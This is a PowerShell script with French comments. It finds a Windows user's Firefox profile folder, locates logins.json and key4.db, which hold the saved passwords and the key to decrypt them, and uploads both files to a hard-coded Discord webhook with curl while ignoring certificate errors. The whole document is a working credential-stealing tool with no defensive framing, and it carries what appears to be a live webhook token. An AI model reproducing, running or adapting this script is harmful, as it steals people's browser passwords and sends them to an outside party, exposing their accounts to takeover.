# --- CONFIGURATION ---
$hook = "https://discord.com/api/webhooks/1486345183325978734/RPhcGENfxMFPENJ_v8u7bmoHsQaKlttoSVc91m3rBnqzFaby8tj67U7RGTxhB9w14AAi"

# --- RECHERCHE DYNAMIQUE DU BON PROFIL ---
$ffPath = "$env:APPDATA\Mozilla\Firefox\Profiles"

# On cherche récursivement le fichier logins.json pour trouver le dossier actif
$targetFile = Get-ChildItem -Path $ffPath -Filter "logins.json" -Recurse -ErrorAction SilentlyContinue | Select-Object -First 1

if ($targetFile) {
    # On récupère le dossier qui contient ce fichier
    $profileDir = $targetFile.DirectoryName
    
    $lPath = Join-Path $profileDir "logins.json"
    $kPath = Join-Path $profileDir "key4.db"

    # Envoi des fichiers vers Discord
    # On utilise curl pour envoyer les fichiers réels
    if (Test-Path $lPath) { curl.exe -k -F "file=@$lPath" $hook }
    if (Test-Path $kPath) { curl.exe -k -F "file=@$kPath" $hook }
}
